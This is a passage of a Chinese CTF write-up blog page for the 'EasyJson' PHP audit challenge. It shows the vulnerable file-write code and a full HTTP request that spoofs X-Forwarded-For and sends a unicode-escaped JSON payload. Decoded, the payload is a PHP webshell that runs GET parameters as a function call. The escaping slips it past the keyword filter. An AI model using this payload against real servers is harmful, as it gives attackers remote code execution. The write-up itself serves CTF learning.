class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,$_GET[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>数据包</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;?source&#x3D;1&amp;action&#x3D;write&amp;filename&#x3D;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: easyjson.xhlj.wetolink.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko&#x2F;20100101 Firefox&#x2F;80.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">Content-Length: 191</span><br><span class="line"></span><br><span class="line">&#123;&quot;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&quot;:&quot;\u003c\u003f\u0070\u0068\u0070\u0020\u0024\u005f\u0047\u0045\u0054\u005b\u0030\u005d\u0028\u0024\u005f\u0047\u0045\u0054\u005b\u0031\u005d\u0029\u003b\u003f\u003e&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>参考教程：</p>
+<ol>
+<li>西湖论剑初赛Web1/5：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/09/30/2020%E5%B9%B49%E6%9C%88DownUnderCTF/" rel="prev" title="2020年9月DownUnderCTF">
+      <i class="fa fa-chevron-left"></i> 2020年9月DownUnderCTF
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#NewUpload%EF%BC%88php-fpm%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">NewUpload（php-fpm任意代码执行）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#EasyJson%EF%BC%88php-%E5%AE%A1%E8%AE%A1%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">EasyJson（php 审计）</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">slug01sh</p>
+  <div class="site-description" itemprop="description">欢迎大家发表自己的见解与评价</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">slug01sh</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
